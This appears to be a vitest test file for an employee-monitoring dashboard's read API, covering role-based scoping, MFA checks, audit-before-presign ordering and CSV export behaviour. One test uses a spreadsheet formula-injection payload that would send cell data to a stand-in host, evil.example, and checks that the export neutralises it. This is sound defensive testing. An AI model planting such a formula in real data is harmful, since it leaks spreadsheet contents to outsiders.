/**
 * `reporting-api` — the dashboard read routes.
 *
 * Two of these tests are the reason the file exists in this shape.
 *
 * **The cross-employee 403.** An employee requesting another employee's timesheets must be refused,
 * and refused *before* a query with that id in it is issued. So the assertion is not only on the
 * status code but on `recorded`: if the SQL never mentions the other employee, the scope rewrite
 * happened where it was supposed to.
 *
 * **Audit-before-presign.** The screenshot URL route must write its `audit_log` row before it
 * generates a URL. Asserted twice: once by comparing the positions of the two statements in
 * `recorded`, and once by making the audit insert fail and checking that no URL comes back. The
 * second is the one that would catch a future refactor wrapping the insert in a `try/catch`.
 *
 * The presigned URL is generated for real, with the fake credentials from `test/setup.ts`, for the
 * same reason `screenshots.test.ts` does it: signing is where the interesting mistakes are, and
 * asserting on the arguments handed to the SDK would assert nothing about the URL.
 */

import { describe, expect, it, beforeEach, vi } from 'vitest';

vi.mock('../../src/shared/db.js', async (importOriginal) =>
  (await import('../helpers/dbMock.js')).dbMockFactory(importOriginal),
);

import { handler } from '../../src/handlers/dashboard/reporting.js';
import type { ApiEvent } from '../../src/shared/http.js';
import { recorded, resetDb, whenQuery } from '../helpers/dbMock.js';
import { errorOf, invoke } from '../helpers/deviceRequest.js';

const ORG_ID = '2f1a6e40-8c3b-4a1d-9f77-0b6e5c4a1d33';
const USER_ID = '9b1d4f70-2c6a-4e58-8a3b-1f7c5d9e2a44';
const EMPLOYEE_ID = '7c9e2b18-4d5a-4c6b-8e21-3f0a9d7b6c55';
const OTHER_EMPLOYEE_ID = '5a2c8e34-9d1b-4f76-8c05-2e6a4b8d1f99';
const DEVICE_ID = 'a41b7d62-95c8-4e3f-b0a7-6d2c5e918f44';
const SCREENSHOT_ID = 'c3d5e7f9-1a2b-4c3d-8e5f-6a7b8c9d0e1f';
const TIMESHEET_ID = 'd1c2b3a4-5566-4778-9900-aabbccddeeff';

type Claims = Record<string, string>;

function claims(overrides: Claims = {}): Claims {
  return {
    sub: 'cognito-sub-1',
    email: 'owner@example.com',
    'wl:org': ORG_ID,
    'wl:user': USER_ID,
    'wl:role': 'owner',
    'wl:employee': '',
    'wl:tz': 'Asia/Kolkata',
    'wl:mfa': 'on',
    ...overrides,
  };
}

const employeeClaims = (id = EMPLOYEE_ID): Claims =>
  claims({ 'wl:role': 'employee', 'wl:employee': id, email: 'employee@example.com' });

interface EventInit {
  method?: string;
  path: string;
  claims?: Claims;
  query?: Record<string, string>;
}

function dashboardEvent(init: EventInit): ApiEvent {
  return {
    httpMethod: init.method ?? 'GET',
    path: init.path,
    headers: { 'user-agent': 'worklens-dashboard/test' },
    body: null,
    isBase64Encoded: false,
    pathParameters: null,
    queryStringParameters: init.query ?? null,
    requestContext: {
      requestId: 'test-request-id',
      identity: { sourceIp: '203.0.113.44' },
      authorizer: { claims: init.claims ?? claims() },
    },
  } as unknown as ApiEvent;
}

// --- canned rows -----------------------------------------------------------

function mockOrganization(): void {
  whenQuery(/from organizations where id = \$1/, [
    { id: ORG_ID, name: 'Acme Pvt Ltd', slug: 'acme', timezone: 'Asia/Kolkata' },
  ]);
}

function mockEmployee(id = EMPLOYEE_ID, fullName = 'Kavya Sundararajan'): void {
  whenQuery(/^select id, full_name, email::text as email/, [
    {
      id,
      full_name: fullName,
      email: 'kavya@example.com',
      external_ref: 'EMP-014',
      timezone: 'Asia/Kolkata',
      status: 'active',
      hired_on: '2024-04-01',
      created_at: new Date('2024-04-01T00:00:00.000Z'),
      updated_at: new Date('2024-04-01T00:00:00.000Z'),
    },
  ]);
}

function mockTimesheets(): void {
  whenQuery(/^select t.id, t.employee_id, e.full_name/, [
    {
      id: TIMESHEET_ID,
      employee_id: EMPLOYEE_ID,
      full_name: 'Kavya Sundararajan',
      work_date: '2026-08-17',
      timezone: 'Asia/Kolkata',
      active_seconds: 25_200,
      idle_seconds: 3600,
      total_seconds: 28_800,
      first_activity_at: new Date('2026-08-17T03:35:00.000Z'),
      last_activity_at: new Date('2026-08-17T12:05:00.000Z'),
      screenshot_count: 12,
      source_event_count: 480,
      version: 2,
      computed_at: new Date('2026-08-18T20:45:00.000Z'),
    },
  ]);
}

function screenshotRow(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    id: SCREENSHOT_ID,
    employee_id: EMPLOYEE_ID,
    device_id: DEVICE_ID,
    captured_at: new Date('2026-08-17T09:45:00.000Z'),
    s3_bucket: 'worklens-test-screenshots',
    s3_key: `screenshots/${ORG_ID}/${EMPLOYEE_ID}/2026/08/17/${SCREENSHOT_ID}.png`,
    content_type: 'image/png',
    byte_count: 145_223,
    blurred: true,
    upload_state: 'uploaded',
    ...overrides,
  };
}

/** Index of the first recorded statement matching `pattern`, or -1. */
function positionOf(pattern: RegExp): number {
  return recorded.findIndex((entry) => pattern.test(entry.sql));
}

const AUDIT_INSERT = /^insert into audit_log/;

beforeEach(() => {
  resetDb();
  mockOrganization();
});

// ---------------------------------------------------------------------------
// GET /v1/me
// ---------------------------------------------------------------------------

describe('GET /v1/me', () => {
  it('returns the employee block for a self-view account', async () => {
    mockEmployee();

    const response = await invoke(
      handler,
      dashboardEvent({ path: '/v1/me', claims: employeeClaims() }),
    );

    expect(response.statusCode).toBe(200);
    expect(response.body).toMatchObject({
      user: { id: USER_ID, role: 'employee' },
      organization: { id: ORG_ID, timezone: 'Asia/Kolkata' },
      employee: { id: EMPLOYEE_ID, timezone: 'Asia/Kolkata' },
      mfa: { configured: true, required: false },
    });
  });

  it('is reachable by an admin with no configured factor, which is how they reach enrolment', async () => {
    const response = await invoke(
      handler,
      dashboardEvent({ path: '/v1/me', claims: claims({ 'wl:mfa': 'off' }) }),
    );

    expect(response.statusCode).toBe(200);
    expect(response.body).toMatchObject({ mfa: { configured: false, required: true } });
  });
});

// ---------------------------------------------------------------------------
// RBAC on the read routes
// ---------------------------------------------------------------------------

describe('RBAC — the query scope is rewritten, never taken from the path', () => {
  it('lets an employee read their own timesheets', async () => {
    mockEmployee();
    mockTimesheets();

    const response = await invoke(
      handler,
      dashboardEvent({
        path: `/v1/employees/${EMPLOYEE_ID}/timesheets`,
        claims: employeeClaims(),
        query: { from: '2026-08-11', to: '2026-08-17' },
      }),
    );

    expect(response.statusCode).toBe(200);
    expect(response.body).toMatchObject({ employee: { id: EMPLOYEE_ID } });
  });

  /**
   * The case the brief names explicitly. Note the second assertion: a 403 that arrives after a
   * query carrying the other employee's id has already run would still be a data leak into the
   * logs and, on a different route, into a response.
   */
  it('refuses an employee requesting another employee’s timesheets with 403', async () => {
    mockEmployee();
    mockTimesheets();

    const response = await invoke(
      handler,
      dashboardEvent({
        path: `/v1/employees/${OTHER_EMPLOYEE_ID}/timesheets`,
        claims: employeeClaims(),
        query: { from: '2026-08-11', to: '2026-08-17' },
      }),
    );

    expect(response.statusCode).toBe(403);
    expect(errorOf(response).code).toBe('FORBIDDEN');

    const leaked = recorded.filter((entry) =>
      entry.values.some((value) => value === OTHER_EMPLOYEE_ID),
    );
    expect(leaked).toEqual([]);
  });

  it('refuses an employee on the same route through the ?employee_id= parameter as well', async () => {
    const response = await invoke(
      handler,
      dashboardEvent({
        path: '/v1/timesheets',
        claims: employeeClaims(),
        query: { from: '2026-08-11', to: '2026-08-17', employee_id: OTHER_EMPLOYEE_ID },
      }),
    );

    // `/v1/timesheets` is owner/manager only (docs/PLAN.md §4), so the role check refuses first.
    expect(response.statusCode).toBe(403);
    expect(recorded).toEqual([]);
  });

  it('refuses an owner without MFA reading another employee through a self-serviceable route', async () => {
    mockEmployee(OTHER_EMPLOYEE_ID);

    const response = await invoke(
      handler,
      dashboardEvent({
        path: `/v1/employees/${OTHER_EMPLOYEE_ID}/timesheets`,
        claims: claims({ 'wl:mfa': 'off', 'wl:employee': EMPLOYEE_ID }),
        query: { from: '2026-08-11', to: '2026-08-17' },
      }),
    );

    expect(errorOf(response).code).toBe('MFA_REQUIRED');
  });

  it('admits an owner with MFA on the overview and refuses one without', async () => {
    whenQuery(/from timesheets where org_id = \$1 and work_date = \$2::date/, [
      {
        active_seconds: 100,
        idle_seconds: 10,
        total_seconds: 110,
        screenshot_count: 3,
        employees_with_activity: 1,
      },
    ]);

    const admitted = await invoke(handler, dashboardEvent({ path: '/v1/overview' }));
    expect(admitted.statusCode).toBe(200);
    expect(admitted.body).toMatchObject({ timezone: 'Asia/Kolkata' });

    const refused = await invoke(
      handler,
      dashboardEvent({ path: '/v1/overview', claims: claims({ 'wl:mfa': 'off' }) }),
    );
    expect(errorOf(refused).code).toBe('MFA_REQUIRED');
  });
});

// ---------------------------------------------------------------------------
// Screenshots
// ---------------------------------------------------------------------------

describe('screenshot access is audited', () => {
  it('audits the gallery listing before the screenshots are read', async () => {
    mockEmployee();
    whenQuery(/^select id, employee_id, device_id, captured_at, width, height/, [screenshotRow()]);

    const response = await invoke(
      handler,
      dashboardEvent({
        path: `/v1/employees/${EMPLOYEE_ID}/screenshots`,
        query: { date: '2026-08-17' },
      }),
    );

    expect(response.statusCode).toBe(200);

    const auditAt = positionOf(AUDIT_INSERT);
    const listAt = positionOf(/^select id, employee_id, device_id, captured_at, width/);
    expect(auditAt).toBeGreaterThanOrEqual(0);
    expect(auditAt).toBeLessThan(listAt);
  });

  it('surfaces the blur flag, so a viewer always knows what they are looking at', async () => {
    mockEmployee();
    whenQuery(/^select id, employee_id, device_id, captured_at, width, height/, [
      screenshotRow({ blurred: false }),
    ]);

    const response = await invoke(
      handler,
      dashboardEvent({
        path: `/v1/employees/${EMPLOYEE_ID}/screenshots`,
        query: { date: '2026-08-17' },
      }),
    );

    const screenshots = (response.body as { screenshots: { blurred: boolean }[] }).screenshots;
    expect(screenshots[0]?.blurred).toBe(false);
  });
});

describe('GET /v1/employees/{id}/screenshots/{sid}/url', () => {
  function mockViewable(overrides: Record<string, unknown> = {}): void {
    whenQuery(/^select id, employee_id, device_id, captured_at, s3_bucket, s3_key/, [
      screenshotRow(overrides),
    ]);
  }

  const urlEvent = (claimsOverride?: Claims): ApiEvent =>
    dashboardEvent({
      path: `/v1/employees/${EMPLOYEE_ID}/screenshots/${SCREENSHOT_ID}/url`,
      ...(claimsOverride === undefined ? {} : { claims: claimsOverride }),
    });

  it('writes the audit row before it issues the URL', async () => {
    mockEmployee();
    mockViewable();

    const response = await invoke(handler, urlEvent());

    expect(response.statusCode).toBe(200);
    const body = response.body as { url: string; expires_in_seconds: number };
    expect(body.url).toContain('X-Amz-Signature=');
    // Deliberately shorter than the 900s an upload URL gets: this one grants a human read access
    // to an image of somebody's screen.
    expect(body.expires_in_seconds).toBe(300);

    const auditAt = positionOf(AUDIT_INSERT);
    const lookupAt = positionOf(/^select id, employee_id, device_id, captured_at, s3_bucket/);
    expect(lookupAt).toBeGreaterThanOrEqual(0);
    // The row is written after the screenshot is known to exist and before anything is signed.
    expect(auditAt).toBeGreaterThan(lookupAt);
  });

  /**
   * The ordering test that matters. If the audit insert fails, no URL may be issued — the trail
   * must not be able to fall behind the access it records.
   */
  it('issues no URL when the audit write fails', async () => {
    mockEmployee();
    mockViewable();
    whenQuery(AUDIT_INSERT, () => {
      throw new Error('audit_log insert failed');
    });

    const response = await invoke(handler, urlEvent());

    expect(response.statusCode).toBe(500);
    expect(response.body).not.toHaveProperty('url');
    expect(errorOf(response).code).toBe('INTERNAL_ERROR');
    // And the failure is opaque: the caller learns nothing about the audit table.
    expect(JSON.stringify(response.body)).not.toContain('audit_log');
  });

  it('refuses a screenshot that never finished uploading', async () => {
    mockEmployee();
    mockViewable({ upload_state: 'pending' });

    const response = await invoke(handler, urlEvent());

    expect(response.statusCode).toBe(404);
    // Nothing is audited for an access that could not have happened.
    expect(positionOf(AUDIT_INSERT)).toBe(-1);
  });

  it('refuses a screenshot the employee scope does not cover', async () => {
    mockEmployee();
    // The employee-scoped lookup finds nothing, which is what another person's id looks like.
    whenQuery(/^select id, employee_id, device_id, captured_at, s3_bucket, s3_key/, []);

    const response = await invoke(handler, urlEvent(employeeClaims()));

    expect(response.statusCode).toBe(404);
    expect(positionOf(AUDIT_INSERT)).toBe(-1);
  });
});

// ---------------------------------------------------------------------------
// Activity
// ---------------------------------------------------------------------------

describe('GET /v1/employees/{id}/activity', () => {
  it('requires a date, so the read of activity_events is always bounded', async () => {
    mockEmployee();

    const response = await invoke(
      handler,
      dashboardEvent({ path: `/v1/employees/${EMPLOYEE_ID}/activity` }),
    );

    expect(response.statusCode).toBe(400);
    expect(errorOf(response).details?.[0]?.field).toBe('date');
  });

  it('bounds the query to the employee’s local day and returns a cursor when the page is full', async () => {
    mockEmployee();
    whenQuery(/from activity_events a left join projects p/, [
      {
        id: '4242',
        device_id: DEVICE_ID,
        event_type: 'window_sample',
        captured_at: new Date('2026-08-17T09:45:00.000Z'),
        duration_seconds: 60,
        app_name: 'Code.exe',
        app_exe: 'C:/code/Code.exe',
        window_title: 'rollup.ts',
        url_host: null,
        url_title: null,
        category: 'Development',
        project_id: null,
        project_name: null,
        is_idle: false,
      },
    ]);

    const response = await invoke(
      handler,
      dashboardEvent({
        path: `/v1/employees/${EMPLOYEE_ID}/activity`,
        query: { date: '2026-08-17', limit: '1' },
      }),
    );

    expect(response.statusCode).toBe(200);
    const body = response.body as { next_cursor: string | null; timezone: string };
    expect(body.timezone).toBe('Asia/Kolkata');
    expect(body.next_cursor).toBeTypeOf('string');

    // Asia/Kolkata is UTC+05:30, so the local day starts at 18:30 UTC the previous evening. A
    // handler that used UTC boundaries would attribute five and a half hours to the wrong day.
    const activity = recorded.find((entry) => entry.sql.includes('from activity_events a left join'));
    expect(activity?.values[2]).toBe('2026-08-16T18:30:00.000Z');
    expect(activity?.values[3]).toBe('2026-08-17T18:30:00.000Z');
  });

  it('rejects a cursor it did not issue', async () => {
    mockEmployee();

    const response = await invoke(
      handler,
      dashboardEvent({
        path: `/v1/employees/${EMPLOYEE_ID}/activity`,
        query: { date: '2026-08-17', cursor: 'notacursor' },
      }),
    );

    expect(response.statusCode).toBe(400);
    expect(errorOf(response).details?.[0]?.field).toBe('cursor');
  });
});

// ---------------------------------------------------------------------------
// CSV export
// ---------------------------------------------------------------------------

describe('GET /v1/reports/export', () => {
  function mockExportRows(fullName: string): void {
    whenQuery(/^select to_char\(t.work_date, 'YYYY-MM-DD'\) as work_date/, [
      {
        work_date: '2026-08-17',
        employee_id: EMPLOYEE_ID,
        full_name: fullName,
        email: 'kavya@example.com',
        external_ref: 'EMP-014',
        timezone: 'Asia/Kolkata',
        active_seconds: 25_200,
        idle_seconds: 3600,
        total_seconds: 28_800,
        first_activity_at: new Date('2026-08-17T03:35:00.000Z'),
        last_activity_at: new Date('2026-08-17T12:05:00.000Z'),
        screenshot_count: 12,
        source_event_count: 480,
      },
    ]);
  }

  async function exportCsv(
    fullName: string,
  ): Promise<{ status: number; csv: string; headers: Record<string, string> }> {
    mockExportRows(fullName);
    const response = await invoke(
      handler,
      dashboardEvent({
        path: '/v1/reports/export',
        query: { format: 'csv', from: '2026-08-01', to: '2026-08-17' },
      }),
    );
    // The body *is* the CSV. It used to be base64 inside a JSON envelope, which the dashboard had to
    // reassemble; `src/shared/http.ts` grew a raw-response branch and this is now a real download.
    return { status: response.statusCode, csv: response.text, headers: response.headers };
  }

  it('starts with a UTF-8 BOM, so Excel does not mangle an accented name', async () => {
    const { status, csv } = await exportCsv('Kavyā Sundararājan');

    expect(status).toBe(200);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
    expect(csv).toContain('Kavyā Sundararājan');
    // RFC 4180 line endings, which is also what Excel wants.
    expect(csv.includes('\r\n')).toBe(true);
  });

  it('is served as a real text/csv download, not as JSON', async () => {
    const { headers, csv } = await exportCsv('Kavyā Sundararājan');

    // One content-type, and it is the right one. The raw branch writes a lower-case `content-type`
    // specifically to replace the `application/json` in SECURITY_HEADERS rather than sit beside it;
    // an object with both `Content-Type` and `content-type` would leave the choice to whatever read
    // it first.
    expect(headers['content-type']).toBe('text/csv; charset=utf-8');
    expect(Object.keys(headers).filter((k) => k.toLowerCase() === 'content-type')).toHaveLength(1);

    // Named, so a browser saves it rather than rendering it.
    expect(headers['content-disposition']).toMatch(
      /^attachment; filename="worklens-timesheets-2026-08-01_2026-08-17.csv"$/,
    );

    // And it is not JSON. Asserted because the failure this replaced was silent: the bytes were
    // correct inside an envelope, so nothing looked broken while every non-dashboard client got an
    // object where it asked for a spreadsheet.
    expect(() => {
      JSON.parse(csv);
    }).toThrow();
    expect(csv).not.toContain('"encoding":');
  });

  it('keeps the security headers on a raw response', async () => {
    // The raw branch spreads SECURITY_HEADERS first and overrides one key. A branch that built its
    // headers from scratch would silently drop nosniff and the rest on the one endpoint that returns
    // a file, which is the endpoint where sniffing matters most.
    const { headers } = await exportCsv('Kavyā Sundararājan');
    expect(headers['x-content-type-options']).toBe('nosniff');
    expect(headers['cache-control']).toBe('no-store');
    expect(headers['strict-transport-security']).toContain('max-age=');
  });

  it('neutralises a name that a spreadsheet would evaluate as a formula', async () => {
    const { csv } = await exportCsv('=HYPERLINK("http://evil.example/?"&A1,"payslip")');

    // Prefixed with an apostrophe, and quoted because the value contains a comma and quotes.
    expect(csv).toContain('"\'=HYPERLINK(""http://evil.example/?""&A1,""payslip"")"');
    expect(csv).not.toContain(',=HYPERLINK');
  });

  it('audits the export before reading a single row', async () => {
    mockExportRows('Kavya Sundararajan');

    await invoke(
      handler,
      dashboardEvent({
        path: '/v1/reports/export',
        query: { format: 'csv', from: '2026-08-01', to: '2026-08-17' },
      }),
    );

    const auditAt = positionOf(AUDIT_INSERT);
    const rowsAt = positionOf(/^select to_char\(t.work_date/);
    expect(auditAt).toBeGreaterThanOrEqual(0);
    expect(auditAt).toBeLessThan(rowsAt);
  });

  it('points a PDF request at the dashboard rather than pretending to render one', async () => {
    const response = await invoke(
      handler,
      dashboardEvent({
        path: '/v1/reports/export',
        query: { format: 'pdf', from: '2026-08-01', to: '2026-08-17' },
      }),
    );

    expect(response.statusCode).toBe(400);
    expect(errorOf(response).details?.[0]?.message).toMatch(/rendered in the dashboard/i);
  });

  it('refuses a range longer than the scan cap', async () => {
    const response = await invoke(
      handler,
      dashboardEvent({
        path: '/v1/reports/export',
        query: { format: 'csv', from: '2020-01-01', to: '2026-08-17' },
      }),
    );

    expect(response.statusCode).toBe(400);
    expect(errorOf(response).details?.[0]?.message).toMatch(/must not exceed 400 days/);
  });

  it('rejects a mistyped query parameter instead of silently widening the scope', async () => {
    const response = await invoke(
      handler,
      dashboardEvent({
        path: '/v1/reports/export',
        // `employeeId` rather than `employee_id` would otherwise mean "the whole organisation".
        query: { format: 'csv', from: '2026-08-01', to: '2026-08-17', employeeId: EMPLOYEE_ID },
      }),
    );

    expect(response.statusCode).toBe(400);
  });
});
